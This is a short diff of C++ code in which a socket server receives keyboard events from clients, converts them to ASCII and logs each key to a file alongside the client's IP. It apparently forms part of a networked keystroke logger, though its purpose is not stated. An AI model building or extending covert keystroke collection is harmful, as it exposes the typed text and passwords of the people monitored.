@@ -66,14 +66,15 @@ void client_handle(int socket) {
 
     // Process the event
     char code = 0;
-    if (event.type == EV_KEY) {
-        code = (event.value == 1) ? event.code : (event.code | RELEASE_CODE); // Example RELEASE_CODE = 0x80
-    }
 
-    // Write to log file
+    code = (event.value == 1) ? event.code : (event.code | RELEASE_CODE); // Example RELEASE_CODE = 0x80
     key_event key = keyboard_handler(code);
-    file << key_to_ascii(key);
-    std::cout << "IP: " << ip << ", Key: " << key_to_ascii(key) << std::endl;
+    if (event.type == EV_KEY) {
+        if(is_ascii(key_to_ascii(key))){
+            file << key_to_ascii(key);
+            std::cout << "IP: " << ip << ", Key: " << key_to_ascii(key) << std::endl;
+        }
+    }
 
     file.close();
     close(socket);
@@ -86,7 +87,7 @@ int main() {
     int opt = 1;
 
     keyboard_init();
-    
+
     // Create the socket
     if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
         std::cerr << "Socket creation failed" << std::endl;
